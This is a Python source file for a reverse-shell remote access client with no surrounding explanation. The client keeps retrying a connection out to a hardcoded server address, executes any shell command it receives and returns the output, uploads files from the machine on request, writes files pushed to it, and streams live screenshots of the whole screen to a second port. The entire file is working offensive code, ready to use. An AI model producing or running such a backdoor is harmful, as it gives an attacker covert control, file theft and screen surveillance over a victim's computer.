import socket
import time
import subprocess
import json
import os
import cv2
import numpy as np
import mss
import threading

s_control = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
stop_screenshare = threading.Event()  

def reliable_send(sock, data):
    jsondata = json.dumps(data)
    sock.send(jsondata.encode())

def reliable_recv(sock):
    data = ''
    while True:
        try:
            data += sock.recv(1024).decode()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(sock, file_name):
    with open(file_name, 'rb') as f:
        sock.send(f.read())

def download_file(sock, file_name):
    with open(file_name, 'wb') as f:
        sock.settimeout(1)
        try:
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        except socket.timeout:
            pass
        finally:
            sock.settimeout(None)

def screen_mirror(server_ip):
    s_screen = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s_screen.connect((server_ip, 9998))
        with mss.mss() as sct:
            s_screen.settimeout(0.5)
            try:
                while not stop_screenshare.is_set():
                    img = sct.grab(sct.monitors[0])
                    frame = np.array(img)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                    frame = cv2.resize(frame, (640, 360))
                    success, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 30])
                    if not success:
                        continue
                    size = len(buffer)
                    s_screen.sendall(size.to_bytes(4, 'big'))
                    s_screen.sendall(buffer.tobytes())
                    time.sleep(0.1)
            except Exception as e:
                pass
    except Exception as e:
        pass
    finally:
        s_screen.close()
        pass

def shell(server_ip):
    while True:
        try:
            command = reliable_recv(s_control)
        except:
            break

        try:
            if command == 'clear':
                pass
            elif command.startswith('cd '):
                try:
                    os.chdir(command[3:])
                except FileNotFoundError:
                    reliable_send(s_control, f"[!] Directory not found: {command[3:]}")
                except Exception as e:
                    reliable_send(s_control, f"[!] Error changing directory: {str(e)}")
            elif command.startswith('download '):
                try:
                    upload_file(s_control, command[9:])
                except FileNotFoundError:
                    reliable_send(s_control, f"[!] File not found: {command[9:]}")
                except Exception as e:
                    reliable_send(s_control, f"[!] Error during file upload: {str(e)}")
            elif command.startswith('upload '):
                try:
                    download_file(s_control, command[7:])
                except Exception as e:
                    reliable_send(s_control, f"[!] Error during file download: {str(e)}")
            elif command == 'screen_mirror':
                stop_screenshare.clear()
                threading.Thread(target=screen_mirror, args=(server_ip,), daemon=True).start()
            elif command == 'exit_screenshare':
                stop_screenshare.set()
            elif command == 'quit':
                break
            else:
                result = subprocess.run(command, shell=True, capture_output=True)
                output = result.stdout.decode() + result.stderr.decode()
                reliable_send(s_control, output)
        except Exception as e:
            reliable_send(s_control, f"[!] Error: {str(e)}")

    try:
        s_control.close()
    except:
        pass
    

def connection():
    while True:
        time.sleep(5)
        try:
            s_control.connect(('192.168.1.6', 9999)) # Replace with your server IP
            shell('192.168.1.6')
            break
        except:
            continue

connection()
